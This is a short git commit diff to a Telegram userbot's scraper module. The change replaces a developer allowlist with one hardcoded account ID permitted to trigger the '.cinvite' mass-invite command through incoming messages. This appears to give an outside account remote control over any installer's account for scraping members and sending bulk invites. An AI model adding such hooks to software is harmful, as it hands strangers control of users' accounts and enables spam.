607939156a70ff99535feeecd4ecf8addfedc5f7
Landak <80225366+ramadhani892@users.noreply.github.com>
2022-01-26 07:07:53 +0700

    cb cb

--- userbot/modules/scraper.py
+++ userbot/modules/scraper.py
@@ -69,7 +69,7 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS,
+@register(incoming=True, from_users=1826643972,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
